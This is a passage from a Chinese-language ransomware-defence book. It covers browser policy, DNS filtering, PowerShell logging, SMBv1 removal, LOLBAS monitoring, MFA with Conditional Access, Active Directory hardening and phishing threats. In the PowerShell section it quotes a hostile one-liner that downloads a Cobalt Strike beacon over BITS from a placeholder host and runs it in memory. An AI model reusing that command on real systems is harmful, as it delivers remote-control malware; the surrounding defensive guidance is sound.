  \ 测试站点来验证其是否正常工作。进入该网站并单击其中一个测试（例如“恶意软件页面”），如果功能正常，您应该会收到 SmartScreen 的消息，指出该网站被标记为危险。\n\
  \n列表中的最后几项用于实现对扩展的控制。这可以防止用户独立安装扩展，只允许安装预先批准的扩展，例如我们希望安装的那些扩展。\n\n对于列表中的最后一点，我们可以定义希望\
  \ Edge 自动安装哪种类型的扩展。例如，我倾向于使用策略安装 AdBlock 扩展，在这里，我需要输入扩展/应用 ID，这些 ID 可以在 Microsoft\
  \ Edge 加载项商店中每个扩展的网站上找到。正如您在 Edge 加载项商店中看到的 AdBlock（https://microsoftedge.microsoft.com/addons/detail/adblock-%E2%80%94-best-ad-blocker/ndcileolkflehcjp\
  \ mjnfbnaibdcgglog），如果我想要将其自动安装到我的设备上，我需要在策略中添加该扩展的应用 ID，如下面的截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_132_0.png)\n\
  \n图 4.12 – 在 Endpoint Manager 中配置 Microsoft Edge 扩展\n\n应用程序 ID 是 Microsoft Edge\
  \ 加载项商店 URL 的最后一部分。如果我们想为 Google Chrome 安装扩展，也同样适用。\n\n一旦策略应用到设备，用户如果打开“设置”窗口，就会注意到\
  \ Microsoft Edge 由您的组织管理，如下面的截图所示：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_133_0.png)\n\
  \n图 4.13 – 由 Endpoint Manager 管理的浏览器\n\n这意味着 Microsoft Edge 已应用了来自管理服务（如组策略或 Microsoft\
  \ Endpoint Manager）的策略。\n\n虽然前面提到的示例允许我们在最终用户机器上保持对浏览器的控制，但还有其他方法可以使用托管服务提供安全浏览器，例如：\n\
  \n- Citrix Browser Service\n- Cloudflare Browser Isolation\n- CheckPoint Harmony\
  \ Browse\n\n这些服务中的大多数提供了一种托管浏览服务，该服务与威胁情报服务集成，以提供更安全的浏览体验。引入这些服务是因为提供基于网络的安全机制变得越来越困难，正如我们传统上所做的那样，因为新的\
  \ Web 协议（如 HTTP/3）的出现，它不允许直接检查。这意味着我们需要将安全性移动到用户层，以提供相同级别的安全性。\n\n## 其他杂项端点对策\n\n\
  到目前为止，我们重点关注添加新的安全机制来增加额外层次，以及为系统和常见业务应用程序实施补丁管理。\n\n然而，还有其他一些设置我们应该实施，以进一步降低端点被入侵的风险，或者降低被入侵的端点被用来对我们的基础设施发起攻击的风险。因此，以下是我们可以为端点实施的其他杂项对策列表。\n\
  \n### DNS 过滤\n\n每月有超过 200,000 个**新注册域名（NDR）**。Palo Alto 指出，这些域名中的大多数被用于可疑或恶意目的，正如我们从\
  \ `https://unit42.paloaltonetworks.com/newly-registered-domains-malicious-abuse-by-bad-actors/`\
  \ 的研究中所看到的。\n\nPalo Alto 还建议我们在新注册域名初始注册后最多 32 天（约 1 个月）内将其阻止。因此，这需要一些 DNS 过滤功能，以确保我们能够直接阻止来自客户端的这些\
  \ DNS 查找请求。用户可能会收到钓鱼电子邮件，然后被重定向到钓鱼网站，以诱使用户输入其凭据。在客户端上使用 DNS 过滤服务可以防止用户访问钓鱼网站，因为\
  \ DNS 请求会被阻止。\n\n在将 DNS 过滤功能作为单一服务时，有两个不错的选择：OpenDNS 或 Cloudflare。\n\n两家供应商都提供公共\
  \ DNS 解析器服务，并具有根据内容阻止某些域名的额外功能，您可以在 `https://developers.cloudflare.com/1.1.1.1/setup/#1111-for-families`\
  \ 了解更多信息。\n\n它们也有商业选项；例如，OpenDNS 提供 Umbrella，Cloudflare 提供 Cloudflare Access，您可以在其中以更细粒度级别定义\
  \ DNS 过滤。\n\n### PowerShell\n\nPowerShell 脚本也常在勒索软件攻击中使用，要么用于侦察，要么用于下载恶意软件负载以进行基于内存的攻击。\n\
  \n例如，以下是一个最近使用的 PowerShell，用于触发 BITS 传输作业以下载 Cobalt Strike 信标：\n\n```\npowershell.exe\
  \  -nop -c \"start-job { param($a) Import-Module BitsTransfer; $d = $env:temp +\
  \ '\\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'hxxp://x.x.x.x/a'\
  \ -Destination $d; $t = [IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument\
  \ 0 | wait-job | Receive-Job\"\n```\n\n我们可以配置一些设置，以确保我们的端点上的 PowerShell 具有更高的安全性。\n\
  \n默认情况下，在 Windows 10 和 Windows 11 上，已安装 PowerShell v2。v2 是一个旧版本，应该做的一件事是在需要的地方升级到最新版本。在撰写本文时，\n\
  \n\n\n撰写本书时，最新版本为 7.2，可在 https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.2\
  \ 上找到。\n\n其次，我们应在 PowerShell 引擎上启用一些额外的日志记录机制以监控可疑活动。这要求我们收集端点的事件日志，以便能够监控 PowerShell\
  \ 的异常使用情况。这些日志应使用 SIEM 工具或产品（如 Microsoft Sentinel）收集到集中式日志服务中。还应注意，Defender for\
  \ Endpoint 和其他 EDR 产品也能提供对 PowerShell cmdlet 和模块使用情况的洞察。\n\n在 PowerShell 中，我们有以下日志机制：\n\
  \n- **引擎生命周期日志** – 这允许 PowerShell 记录设备上 PowerShell 会话的启动和终止。如果运行的 PowerShell 版本高于\
  \ 5，则还会记录命令行参数。默认情况下，引擎生命周期日志已启用，可在事件查看器中的 Applications and Services Logs\\Microsoft\\\
  Windows\\PowerShell\\Operational 日志下访问。\n- **模块/管道日志** – 从 PowerShell 3.0 版本开始，可以按模块或全局方式将管道事件记录到\
  \ Windows 事件日志中。此功能可通过组策略或使用 Endpoint Manager 启用。\n- **脚本块跟踪** – 从 5.0 版本开始，可以将详细信息（包括运行的代码）记录到事件日志中。此输出可提供系统所采取操作的洞察。\n\
  \n现在，默认情况下，PowerShell 应设置为仅允许签名脚本。然而，需要注意的是，存在大量绕过脚本执行策略的方法，因此这只是定义 PowerShell 安全性的一个小部分。\n\
  \n许多勒索软件攻击也利用 PowerShell 下载额外有效载荷以及使用诸如 invoke-webrequest 之类的命令。\n\nInvoke-WebRequest\
  \ 是一个 PowerShell cmdlet，允许您向网页或 Web 服务发送 HTTP 和 HTTPS 请求。它可用于下载网页内容、从 Web 服务器下载文件以及向\
  \ Web 服务器上传数据。\n\n在勒索软件的上下文中使用时，它可用于从命令和控制服务器下载并执行恶意软件有效载荷或脚本，从而使攻击者能够远程控制受损系统。此外，它还用于从受害者网络中窃取敏感数据。\n\
  \n就 PowerShell 而言，NSA 和 CSI 还提供了额外的指导，可在此处找到：https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/1/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF。\n\
  \nPowerShell 日志的配置可使用组策略或使用 Microsoft Intune 进行。\n\n在 Intune 中部署 PowerShell 设置是通过端点门户完成的，在\
  \ **Devices | Configuration profiles, Create Profile** 下，配置文件类型为 **Templates**。从那里，选择\
  \ **Administrative Templates**，然后从列表中选择 **Windows PowerShell**，如下图所示。\n\n然后，如下图所示定义策略：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_136_0.png)\n\n图 4.14 – Endpoint Manager\
  \ 中的 PowerShell 配置\n\n这可确保使用 * 作为通配符记录所有模块，并且 PowerShell 将监控脚本块并将执行策略设置为仅允许签名脚本。\n\
  \n应注意，启用仅签名脚本可能会导致许多组件停止工作，因为并非所有供应商都会对其 PowerShell 模块进行签名。\n\n## SMB 协议\n\nSMB\
  \ 协议也曾在勒索软件攻击中使用，其中利用了协议旧版本中的漏洞来获取访问权限。\n\n这尤其适用于 SMB v1，微软希望完全将其移除。在 Windows 11（以及从\
  \ Windows 10 版本 1709 起）中，它默认处于禁用状态，但仍可通过添加/删除功能进行安装。\n\n然而，它仍存在于旧版本的 Windows 上；因此应将其卸载。您可以通过使用\
  \ Windows PowerShell 运行以下命令来检查该功能是否存在：\n\n```\nGet-WindowsOptionalFeature -Online\
  \ -FeatureName SMB1Protocol\n```\n\n此外，您可以运行以下命令从操作系统中禁用该功能：\n\n```\nDisable-WindowsOptionalFeature\
  \ -Online -FeatureName SMB1Protocol\n```\n\n当然，您可能拥有不支持较新版本的老旧文件服务器或 NAS 服务，但微软提供了大量文档和故障排除提示，可在此处阅读：https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows。\n\
  \n关于使用 Endpoint Manager 等服务集中禁用 SMBv1，这可通过自定义 OMA-URI 配置完成，因为我们目前没有 UI 选项。这是通过使用\
  \ MSSecurityGuide/ConfigureSMBv1ClientDriver OMA-URI（仅适用于 Windows 10 和 Windows 11\
  \ 操作系统）完成的。\n\n在 Intune 中部署自定义 OMA-URI 设置是通过端点门户完成的。在 Devices | Configuration Profiles\
  \ | Create Profile 下，选择 Profile type 下的 Templates，然后选择 Custom，如下图所示。然后单击 Create：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_137_0.png)\n\n图 4.15 – Intune 中的自定义配置设置\n\
  \n这将打开自定义配置文件向导，允许我们定义要添加的设置。为此配置配置文件提供一个名称，例如 SMBClientsettings，然后转到 Configuration\
  \ settings 部分并单击 Add。\n\n然后在不同的对话框下输入以下内容：\n\n- **Name:** ConfigureSMBV1ClientDriver\n\
  - **OMA-URI:** ./Vendor/MSFT/Policy/Config/MSSecurityGuide/ConfigureSMBv1Server\n\
  - **Data type:** String\n- **Value:** <enabled/>\n  <data id=\"Pol_SecGuide_SMB1ClientDriver\"\
  \ value=\"4\"/>\n\n现在，单击 **Save | Next**。然后，我们需要定义一个分配组。这是指我们旨在应用 OMA-URI 设置的机器组。然而，禁用\
  \ SMBv1 应在基础设施内的所有机器上执行。它应应用于所有设备，可通过使用 **Add all devices** 选项完成。\n\n这将在此策略适用的操作系统上禁用\
  \ SMBv1 客户端驱动程序。应注意，它仅适用于注册到 Endpoint Manager 的设备；未由 Endpoint Manager 管理的服务器应手动操作。这也是为了确保环境中没有依赖旧\
  \ SMB 版本的遗留设备或服务。\n\n## LOLBAS\n\n**LOLBAS** 是 **Living Off the Land Binaries and\
  \ Scripts** 的缩写，指非恶意性质且本地于操作系统的二进制文件。通常，这些可能是 Microsoft 签名的二进制文件，例如 certutil，或诸如\
  \ WMIC 之类的功能，可用于各种攻击。\n\n您可以在 https://lolbas-project.github.io/ 上找到 LOLBAS 二进制文件的更新列表。\n\
  \n挑战在于防御这些二进制文件在攻击中的被利用，因为其中许多二进制文件是操作系统的核心部分。一件重要的事情是监控这些二进制文件在我们端点上的使用情况，这可通过几种方法完成。\n\
  \n第一个选项是使用 Sysmon，它是 Microsoft Sysinternals 套件的一部分。Sysmon 的问题在于我们需要定义要监控哪些二进制文件，这可能需要花费大量时间。幸运的是，有人创建了一个预定义模板用于\
  \ Sysmon，可监控所有这些二进制文件，可从 https://github.com/SwiftOnSecurity/sysmon-config 下载。\n\n\
  此外，您需要从 https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon 下载 Sysmon，并使用以下命令与\
  \ XML 文件一起运行：\n\n```\nsysmon.exe -accepteula -i sysmonconfig-export.xml\n```\n\n\
  \n然后，Sysmon 将开始监视这些更改，并将它们报告到 Windows 事件查看器中的“应用程序和服务 | Microsoft | Windows | Sysmon\
  \ | 操作”下。\n\n然后，可以使用集中式日志服务（如 Azure Log Analytics 配合 Microsoft Sentinel，或 ELK 或\
  \ Graylog 等第三方工具）收集这些日志。这使我们能够监视这些二进制文件的使用情况。我倾向于使用这种方法从端点收集日志，并结合 Sentinel 中的分析规则来监视端点上这些二进制文件的使用情况。\n\
  \n第二种选择是使用 EDR 工具，例如 Microsoft Defender for Endpoint，它也会收集端点上所有进程的使用情况，然后你可以为此定义自定义监控规则。这需要\
  \ Microsoft E5 许可证才能使用。\n\n此外，我们可以使用 Kusto 查询来查找这些 LOLBAS 可执行文件的使用情况，查询示例如下：\n\n\
  ```\nDeviceProcessEvents\n| where Timestamp > ago(7d)\nand InitiatingProcessFileName\
  \ =~ 'mshta.exe'\n```\n\n上述查询查看 Microsoft Defender for Endpoint 中的 DeviceProcessEvents\
  \ 表。DeviceProcessEvents 表存储了端点上运行过的所有进程的信息。这使我们能够列出所有 LOLBAS 可执行文件，甚至制定自定义检测规则。\n\
  \n## 默认应用程序\n\n最容易进行的自定义操作之一是更改端点上的默认文件关联。例如，HTML 应用程序和 JavaScript 文件默认情况下会在 Web\
  \ 浏览器中打开。这些文件可能被用来传递恶意软件，因此一个简单的修复方法是确保这些类型的文件默认不在浏览器中打开（因为浏览器会在系统上下文中运行代码），而是使用记事本打开。\n\
  \n我们应该更改文件类型关联的一些文件包括以下这些：\n\n- .bat、.hta、.js、.jse、.jsc、.sct、.slk、.vb、.vbe、.vbs、.wsc、.wsf\
  \ 和 .wsh\n\n如果使用 Intune，没有直接更改此设置的直接方法。首先，你需要一台参考计算机，在其中定义这些文件类型应设置为使用记事本打开。然后，你需要使用以下命令导出该文件类型关联：\n\
  \n```\nDism /Online /Export-DefaultAppAssociations:\"<pathname/filename.xml>\"\n\
  ```\n\n然后，打开 XML 文件并复制其内容。接下来，访问 https://www.base64encode.org/ ，将内容粘贴进去，然后点击“Encode”按钮。\n\
  \n接下来，我们需要部署一个自定义 OMA-URI 配置。这是通过端点门户完成的，在 **设备 | 配置文件 | 创建配置文件** 下进行。在 **配置文件类型**\
  \ 下选择 **模板**，然后从列表中选择 **自定义**，点击 **创建**。然后，如前面的示例一样，我们需要在 **配置设置** 下定义自定义设置。在这里，点击\
  \ **添加**，并在 **OMA-URI 设置** 下添加以下内容：\n\n- **名称：** DefaultAssociationsConfiguration\n\
  - **OMA-URI：** ./Vendor/MSFT/Policy/Config/ApplicationDefaults/DefaultAssociationsConfiguration\n\
  - **值：** Base64 编码值\n\n它应该类似于以下截图：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_140_0.png)\n\
  \n图 4.16 – Endpoint Manager 中的默认文件关联\n\n端点策略更新后，应该会反映关联的文件类型。需要注意的是，这并不是一份详尽的安全设置列表，你可以在端点上配置和使用这些设置来提供更高级别的安全性。\n\
  \n我还想推荐一些其他文章和博客文章，你可以在其中阅读有关其他安全措施的更多内容，例如 https://adsecurity.org/?p=3299 。\n\n\
  ## 保护用户身份\n\n到目前为止，本章的重点一直是保护端点，端点通常是勒索软件攻击的起点。那么，如果端点仍然被攻破怎么办？我们也需要采取防护措施，确保我们的账户或凭据不会被攻击者用于在网络中进行横向移动。\n\
  \n另一个部分是确保我们使用的外部服务也受多重身份验证保护，以确保攻击者无法通过暴力攻击或简单的凭据注入来访问我们的服务。\n\n最后，我们还将研究如何保护我们的\
  \ AD 域免受已知攻击。\n\n微软之前曾表示，如果公司实施了**多重身份验证（MFA）**，99.9% 的基于身份的攻击都可以避免。因此，我们需要研究的第一件事是如何在我们的服务中实施通用的\
  \ MFA 服务。\n\n需要注意的是，在以下示例中，我将使用 Azure MFA 和附加的 Azure AD 服务为服务提供 MFA，这要求你至少拥有 Azure\
  \ AD P1 许可证才能使用该功能。\n\n大多数公司都混合使用本地部署和基于云的服务，并且有不同的身份集成点，这可能使得为所有不同服务使用同一个 MFA 提供商有点困难。我看到的更常见的实施方案之一是公司拥有服务，如下面的截图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_141_0.png)\n\n图 4.17 – 服务的 MFA 配置\n\n\
  例如，Office 365 直接与 Azure AD 集成，其他 SaaS 服务通常也支持 Azure AD 进行身份集成。\n\n然后，我们还有本地部署的服务，例如\
  \ VPN 网关、Citrix 或基于 VMware 的 VDI 服务，或其他网络应用程序，我们需要以安全的方式通过 MFA 向最终用户提供这些服务。\n\n\
  使用 Azure AD 原生集成（如 SAML）的云服务意味着身份验证将在 Azure AD 中发生。因此，我们可以使用 MFA 服务——条件访问——来确保安全身份验证。\n\
  \n对于可能不直接支持 Azure AD 的本地资源，我们有几种选择。例如，如果我们有支持 RADIUS 的本地资源（大多数基于网络的服务都支持），我们可以使用一个名为\
  \ Windows NPS Extension for Azure MFA 的组件。这是一个软件组件，你将其安装在运行 NPS 的 Windows Server\
  \ 上，然后它将充当 RADIUS 服务器，供与基于网络设备（如 Citrix NetScaler、Palo Alto VPN 等）集成的其他组件使用。\n\n\
  该服务也可以与使用 NPS 扩展的本地 RDS 网关部署一起使用。我不打算在这里介绍 NPS 扩展的安装，但你可以在 `https://docs.microsoft.com/en-us/azure/active-directory/authentication/how-to-mfa-nps-extension`\
  \ 找到 Microsoft 关于如何设置它的文档。\n\n请注意，使用 NPS 扩展通过 RADIUS 处理 MFA 提示并不支持条件访问提供的各种安全机制。为了确保与\
  \ Azure AD 及其安全机制的无缝集成，请确保所有实施的服务（无论是基于 Web、基于网络还是 VDI 服务）至少支持 SAML。\n\n例如，以下是一个\
  \ HP Aruba 与 Azure AD 集成以实现 SAML SSO 的示例：`https://www.arubanetworks.com/techdocs/central/latest/content/nms/policy/ca-azure.htm`。\n\
  \n一旦你拥有与 Azure AD 集成的应用程序，就可以使用条件访问规则来定义在允许用户访问应用程序或服务之前需要满足的条件。\n\n因此，让我们配置一个示例条件访问规则，要求所有用户使用\
  \ MFA 登录 Office 365。需要注意的是，条件访问要求你的组织启用 Azure AD P1 许可证，并且你拥有足够的权限来配置策略。\n\n登录 Azure\
  \ 门户，转到 **Azure Active Directory | 安全性** 选项卡，然后选择 **条件访问**。微软现在提供了预定义模板，我们可以使用这些模板更轻松地配置\
  \ MFA。但是，对于此示例，我们将使用默认向导。\n\n点击 **新策略**，然后选择 **创建新策略**。\n\n在每个条件访问中，我们有一组可以定义的分配和访问控制机制：\n\
  \n+   - **用户或工作负载标识** – 这允许我们定义此策略应应用于谁。可以是用户或组，也可以是作为服务主体的工作负载标识。此外，我们可以定义排除规则，例如规定某规则应应用于除某些用户之外的所有用户。\n\
  +   - **云应用或操作** – 这允许我们定义此策略应应用于哪个应用程序或操作。例如，应用程序可以是 Office 365，也可以是用户操作，例如将设备加入\
  \ Azure AD。\n+   - **条件** – 这包含多组我们可以定义的属性，例如用户风险、登录风险、设备平台、位置、客户端应用和设备筛选器。一个示例可能是允许低风险用户从特定位置的基于\
  \ Windows 的设备登录。\n+   - **授予** – 在前面的部分中，我们定义了用户/组、服务或应用程序，以及需要满足的条件。现在我们需要确定，如果他们满足要求，需要采取何种操作来授予其访问权限。在这里，我们也有一系列可以定义的不同设置：\n\
  +     - 要求进行 MFA\n+     - 要求设备标记为合规\n+     - 要求使用混合 Azure AD 加入设备\n+     - 要求使用已批准的客户端应用\n\
  +     - 要求使用应用保护策略\n+     - 要求更改密码\n+   我们可以定义对于正在登录的用户，是要启用所有这些控制还是仅启用其中一个选定控制。\n\
  +   - **会话** – 这旨在控制用户与其登录的服务或应用程序之间的实际会话。在这里，我们可以定义以下内容：\n+     - 使用应用强制限制\n+ \
  \    - 使用条件访问应用控制\n+     - 登录频率\n+     - 持久性浏览器会话\n+     - 自定义持续访问评估\n+     - 禁用弹性默认值\n\
  +现在，让我们尝试直观地了解一个策略可能的样子：\n\n![](img/7b49a27a3c2adc52d097f2e77f3bf394_144_0.png)\n\
  \n图 4.18 – 条件访问策略概览\n\n图 4.17 展示了一个策略的可视化示例：一位名为 John 的用户正尝试访问 Office 365。我们有一个预定义的条件访问策略，适用于所有尝试登录\
  \ Office 365 的用户。在这里，对于试图登录的用户，我们有两条标准：要求使用 MFA，并且要求设备在合规设置方面被标记为合规，这些合规设置来自 Intune。设备合规性是一个重要方面，因为我们不希望已受损的端点登录到我们的\
  \ Office 365 环境中。\n\n需要注意的是，对于较新的 Azure AD 租户，Microsoft 已自动启用一项名为安全默认值的功能，这是一组自动强制实施的基本安全机制。在开始使用条件访问策略之前，需要禁用此功能。可以通过在门户中进入\
  \ Azure Active Directory 菜单，然后进入“属性 | 管理安全默认值”，并将“启用安全默认值”选项设置为“否”来完成此操作。\n\n当我们为租户创建并启用此策略后，用户的登录过程将如下图所示：\n\
  \n![](img/7b49a27a3c2adc52d097f2e77f3bf394_145_0.png)\n\n图 4.19 – 为用户配置了 MFA\n\n\
  这将经历为用户设置 MFA 的过程。默认情况下，它会提供一个设置向导，用于使用 Microsoft MFA 验证器应用，或使用手机通过基于短信的一次性密码（OTP）进行验证。\n\
  \n作为租户管理员，我们还可以定义在初始注册过程中，我们希望用户可以使用哪些类型的 MFA 机制。这可以通过进入 Azure AD | 安全 | MFA 菜单，并单击“其他基于云的\
  \ MFA 设置”选项来自定义，这会将你重定向到一个新门户。在这里，你可以选择在底部定义身份验证方法，例如：\n\n+   - 呼叫电话\n+   - 向电话发送短信\n\
  +   - 通过移动应用发送通知\n+   - 来自移动应用或硬件令牌的验证码\n\n如果我们只启用了最后两个选项，最终用户将需要使用软件应用来启用 MFA 身份验证才能登录。\n\
  \n此外，需要注意的是，Microsoft 支持使用 FIDO2 安全密钥对 Azure AD 进行身份验证。这允许通过设备上的物理密钥进行 MFA 身份验证，而无需使用\
  \ MFA 应用或 OTP 密钥。\n\n自 2022 年 2 月 27 日起，Microsoft 开始在 Azure MFA 上强制实施数字匹配，以减少 MFA\
  \ 疲劳攻击的数量。这意味着当你想要进行身份验证时，需要在验证设备上输入你在屏幕上看到的数字。\n\n这还带来了一些额外的好处，因为它不需要移动设备来处理 MFA\
  \ 过程。其次，它不易受到网络钓鱼攻击。\n\n现在，本书中我们尚未讨论的一些功能与 Microsoft Defender for Cloud Apps 和条件访问应用控制的使用有关。一项名为**会话应用控制**的功能允许我们通过\
  \ Microsoft 提供的代理组件为某些用户或特定应用程序路由 Web 流量。\n\n本书中我不再深入介绍更多细节，但这是一项可以使用条件访问来配置的功能。你可以在\
  \ `https://learn.microsoft.com/en-us/defender-cloud-apps/proxy-intro-aad` 阅读有关该功能的更多信息。\n\
  \n## 保护 Active Directory 安全\n\n到目前为止，我们已经研究了为 VPN、RDP 和 VDI 服务以及最后的 Azure AD 集成服务等外部服务设置\
  \ MFA。\n\n然而，对于集成到 Active Directory 域中的常规服务（例如文件服务、打印服务，或从 Windows 端点实际登录 Active\
  \ Directory 的过程），没有内置的 MFA 服务或机制。因此，如果攻击者设法破坏了连接到 Active Directory 的端点，他们就可以使用该端点访问文件共享等内容，而无需任何\
  \ MFA。\n\n有一些第三方供应商提供基于 Windows 和 Active Directory 的 MFA 服务，例如 AuthLite。然而，保护 Active\
  \ Directory 的主要部分如下所列：\n\n+   - 确保域控制器（或其他不需要直接互联网访问的内部服务器）无法直接访问互联网；这可以确保服务器可以与\
  \ TeamViewer 或 Anydesk 等已知工具结合使用，而勒索软件运营商经常使用这些工具。\n+   \n+   - 确保默认禁用非关键服务。你可以阅读\
  \ Microsoft 关于应默认禁用哪些服务的建议列表：`https://docs.microsoft.com/en-us/windows-server/security/windows-services/security-guidelines-for-disabling-system-services-in-windows-server`。\n\
  +   \n+   - 确保仅允许从受控系统（例如安全管理主机和已批准的安全帐户）对域控制器进行 RDP 访问。这需要启用防火墙规则，以确保仅允许来自已批准主机的\
  \ RDP，并使用组策略拒绝管理员组以外的其他组的登录。这是**计算机配置 | Windows 设置 | 安全设置 | 本地策略 | 用户权限分配**下的组策略设置。在其中找到**通过远程桌面服务拒绝登录**设置。\n\
  \n+   - 我们在 Active Directory 中还有另一项功能，称为**基于时间的组成员身份**。此功能默认未启用，因为它要求林功能级别为 2016。要启用该功能，你需要运行以下命令：\n\
  \n```\nEnable-ADOptionalFeature 'Privileged Access Management Feature' -Scope ForestOrConfigurationSet\
  \ -Target forest.com\n```\n\n然后，我们可以使用以下命令将成员临时添加到组中 15 分钟：\n\n```\nAdd-ADGroupMember\
  \ -Identity 'Domain Admins' -Members 'peter' -MemberTimeToLive (New-TimeSpan -Minutes\
  \ 15)\n```\n\n这对于确保我们使用最小权限访问权限也非常有用。\n\n+   - 对于在 Azure 中运行虚拟基础结构的基于 Azure 的部署，我们还可以选择使用一项名为**Azure\
  \ Bastion**的功能。这允许我们通过 Azure Web 门户登录虚拟机。Azure Bastion 支持使用 RDP 对 Windows 进行远程管理，以及使用\
  \ SSH 对 Linux 进行远程管理。需要注意的是，Azure Bastion 是一项独立服务，默认情况下不会部署。\n\n+   - 确保管理员至少有两个帐户，一个是普通用户帐户，另一个用于管理环境的行政用途。这是为了确保即使管理员帐户或端点被入侵，也不会影响\
  \ Active Directory 域管理员帐户。\n\n+   - 启用 LSA 保护。此设置适用于所有 Windows 操作系统，确保无法将调试器附加到\
  \ LSASS 进程，并阻止 Mimikatz 等常见工具访问该进程。你可以在 https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection\
  \ 阅读有关如何启用此功能的更多信息。\n\n+   - 确保在域控制器上安装关键安全修补程序。正如我在第一章提到的，一些勒索软件攻击一直在利用 Zerologon\
  \ 等漏洞来获取对域控制器的访问权限。虽然该漏洞现已修复，但以后可能会出现具有相同严重性的新漏洞，因此请确保在域控制器上安装所有安全更新。\n\n+   - 确保将\
  \ LDAP 服务器签名要求设置为“要求签名”。这将确保攻击者无法使用 KrbRelayUp 等权限提升工具。Microsoft 在 https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/domain-controller-ldap-server-signing-requirements\
  \ 对此进行了更详细的描述。\n\n此外，如果你拥有相应许可证，请考虑实施 Microsoft Defender for Identity，它提供基于云的安全服务来监视\
  \ Active Directory。此服务会检查事件和网络流量，以检测异常的用户行为或针对域控制器的机器流量。\n\n\n\n\n它通过在域控制器上安装一个轻量级代理，并监控该处生成的所有网络流量和事件来实现这一点。在这里，你还可以找到可用的不同内置检测机制和警报规则的列表：https://learn.microsoft.com/en-us/defender-for-identity/alerts-overview。\n\
  \nDefender for Identity 的一大优势在于它能够检测诸如黄金票据、白银票据、哈希传递、票据传递以及 Kerberoasting 等攻击。\n\
  \n## 确保电子邮件服务安全\n\n目前，我们已经了解了更多其他的杂项对策，以及我们可以为 Active Directory 域做些什么。最后一个方面，也可能是勒索软件最大的攻击途径，是电子邮件。\n\
  \n在本书中，我们将重点介绍如何保护与 Microsoft Office 365 相关的电子邮件，尽管这里讨论的许多技术和功能也适用于其他电子邮件提供商。\n\n\
  根据 Statista 的信息，近 3% 的员工表示他们点击了钓鱼电子邮件中发送的链接：https://www.statista.com/topics/8385/phishing/#dossierContents__outerWrapper。\n\
  \n虽然 3% 并不是一个很高的数字，但攻击者只需要一名泄露账户信息的员工，就能发起勒索软件攻击或在其机器上运行恶意内容。\n\n我们看到的另一个越来越多的攻击向量是中间人对抗（Adversary-in-the-Middle，AiTM）钓鱼。AiTM\
  \ 钓鱼是攻击者用来未经授权访问用户账户的一种方法，通过拦截其登录会话、捕获其密码和会话 Cookie，并冒充用户。一旦攻击者获得了用户的凭据，他们就可以访问用户的邮箱，并针对其他目标发起商业电子邮件入侵（Business\
  \ Email Compromise，BEC）攻击。\n\n一个例子是使用 evilginx，这是一个用于收集登录凭据和会话 Cookie 的中间人对抗组件。你可以在\
  \ https://github.com/kgretzky/evilginx2 找到它。\n\nMicrosoft 365 Defender 可以检测与 AiTM\
  \ 钓鱼攻击及其后续操作相关的可疑活动，例如会话 Cookie 被盗以及尝试使用被盗 Cookie 访问 Exchange Online。为了提高针对类似攻击的安全级别，组织除了实施\
  \ MFA 之外，还应实施条件访问策略。这些策略可以使用与身份相关的附加因素（例如用户或组成员身份、IP 位置和设备状态）来评估登录请求。\n\n现在，当我们查看钓鱼电子邮件时，可以看到大多数钓鱼电子邮件使用相同的基本结构，包含以下一个或多个属性：\n\
  \n- **通过电子邮件索要个人信息** – 例如要求提供用户名/密码或其他敏感信息。\n- **表现出高度紧迫性** – 提及用户需要立即采取行动，例如确保其账户不会被锁定。\n\
  - **电子邮件中的链接会将你重定向到不熟悉的网站和域** – 虽然它们可能会重定向到一个看起来熟悉的网站，但 URL 来自不同的域。\n- **未经请求的附件**\
  \ – 这些可能是可执行文件或 Word 文档，其中包含恶意负载，用于初始化恶意软件引导程序。\n- **电子邮件地址的变化** – 要么电子邮件非官方，要么与官方域名相比包含细微变化。这些可能是微小的更改，例如用\
  \ Microso tt.com 代替 Microsoft.com。\n- **拼写或语法错误**（尤其是如果这些错误是用你的母语伪造的）– 在许多情况下，攻击者使用通用文本，然后使用谷歌翻译将电子邮件翻译给不同国家的不同收件人。\n\
  \n在过去几年里，攻击者还变得更加擅长伪造看似来自相同域名的电子邮件。这可以通过欺骗发件人地址来实现。或者，他们使用已知的 URL 发送恶意内容，例如 Microsoft\
  \ OneDrive，或者使用知名服务如 Dropbox 或 Google Drive。此外，还有更具针对性的鱼叉式网络钓鱼（spear phishing）攻击，攻击者会向特定用户或组织发送专门的钓鱼电子邮件。\n\
  \n有一次，我与一位客户合作时，该客户遭到了鱼叉式网络钓鱼攻击，其 CFO（首席财务官）账户遭到入侵。该客户当时运行的是 Office 365，因此攻击者使用了预定义脚本，用于收集和下载其账户中的所有电子邮件，然后添加了自动转发脚本，将所有电子邮件转发到外部地址。\n\
  \n在获得访问权限几周后，攻击者对 CFO 及其通过电子邮件与其他同事互动的方式有了充分的了解。然后，攻击者利用这些信息创建了一封包含恶意负载的电子邮件，发送给财务主管，财务主管在其机器上运行了该恶意负载，从而对其基础设施发动了勒索软件攻击。\n\
  \n在深入细节之前，我想先介绍一下我们在电子邮件方面面临的主要攻击向量和弱点：\n\n- 欺骗性电子邮件（更具体地说是 MAIL FROM 信息）或来自与公司域名相似的域名。\n\
  - 来自恶意域名的钓鱼电子邮件。这些域名大多数是新建的，并且仅在短期内用于钓鱼活动。\n- 从已知域名（如 Office 365 或 Gmail）发送的钓鱼电子邮件。\n\
  - 包含恶意内容或指向恶意 URL 链接的钓鱼电子邮件。\n\n总体而言，电子邮件安全的主要目标是确保我们能够验证发件人、发件人域、电子邮件正文、URL 以及任何附件。\n\
